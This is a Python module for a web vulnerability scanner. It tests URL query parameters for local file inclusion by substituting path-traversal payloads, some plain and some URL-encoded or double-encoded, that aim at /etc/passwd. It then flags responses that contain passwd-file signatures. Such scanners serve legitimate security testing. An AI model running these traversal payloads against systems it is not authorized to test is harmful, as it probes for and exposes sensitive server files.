#!/usr/bin/env python3

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style

class LFIScanner:
    """Scanner for detecting Local File Inclusion (LFI) vulnerabilities"""
    
    def __init__(self, scanner_instance):
        """
        Initialize the LFI Scanner with a reference to the main scanner instance
        
        Args:
            scanner_instance: The main WebScanner instance
        """
        self.scanner = scanner_instance
        self.target_url = scanner_instance.target_url
        self.session = scanner_instance.session
        self.timeout = scanner_instance.timeout
        self.verbose = scanner_instance.verbose
        self.max_threads = scanner_instance.max_threads
        self.vulnerabilities = scanner_instance.vulnerabilities
        self.discovered_urls = scanner_instance.discovered_urls
        
        # LFI payloads to test
        self.lfi_payloads = [
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '../etc/passwd',
            '../../etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd'
        ]
        
        # Patterns to look for in responses indicating successful LFI
        self.lfi_patterns = [
            'root:x:0:0',
            'nobody:x:',
            'bin:x:',
            'daemon:x:'
        ]
    
    def test_url_parameter(self, url):
        """
        Test URL parameters for LFI vulnerabilities
        
        Args:
            url (str): URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        # Parse the URL to get query parameters
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # If there are no query parameters, return
        if not query_params:
            return vulnerabilities
            
        # Test each parameter with each LFI payload
        for param_name, param_values in query_params.items():
            original_value = param_values[0] if param_values else ''
            
            for payload in self.lfi_payloads:
                # Create a copy of the original query parameters
                modified_params = parse_qs(parsed_url.query)
                
                # Modify the target parameter
                modified_params[param_name] = [payload]
                
                # Rebuild the query string
                modified_query = urlencode(modified_params, doseq=True)
                
                # Reconstruct the URL
                modified_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    modified_query,
                    parsed_url.fragment
                ))
                
                try:
                    response = self.session.get(modified_url, timeout=self.timeout)
                    content = response.text.lower()
                    
                    # Check for LFI patterns in the response
                    for pattern in self.lfi_patterns:
                        if pattern.lower() in content:
                            vulnerability = {
                                'type': 'Local File Inclusion',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': pattern,
                                'severity': 'High'
                            }
                            vulnerabilities.append(vulnerability)
                            self.vulnerabilities.append(vulnerability)
                            
                            if self.verbose:
                                print(Fore.RED + f"[!] Local File Inclusion found at {url} in parameter {param_name}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Evidence: {pattern}" + Style.RESET_ALL)
                            
                            # Found a vulnerability, no need to continue with other payloads for this parameter
                            return vulnerabilities
                
                except Exception as e:
                    if self.verbose:
                        print(Fore.YELLOW + f"  [!] Error testing {url}: {str(e)}" + Style.RESET_ALL)
                    continue
        
        return vulnerabilities
    
    def run(self):
        """
        Test for LFI vulnerabilities in URL parameters
        
        Returns:
            int: Number of LFI vulnerabilities found
        """
        lfi_count = sum(1 for v in self.vulnerabilities if v.get('type') == 'Local File Inclusion')
        
        if self.verbose:
            print(Fore.BLUE + "[*] Testing for Local File Inclusion vulnerabilities..." + Style.RESET_ALL)
        
        # Test URL parameters for LFI
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            results = list(executor.map(self.test_url_parameter, self.discovered_urls))
        
        # Count how many LFI vulnerabilities were found
        lfi_vulnerabilities = sum(1 for v in self.vulnerabilities if v.get('type') == 'Local File Inclusion')
        lfi_vulnerabilities_found = lfi_vulnerabilities - lfi_count
        
        print(Fore.GREEN + f"[+] Completed LFI testing, found {lfi_vulnerabilities_found} vulnerabilities" + Style.RESET_ALL)
        return lfi_vulnerabilities_found 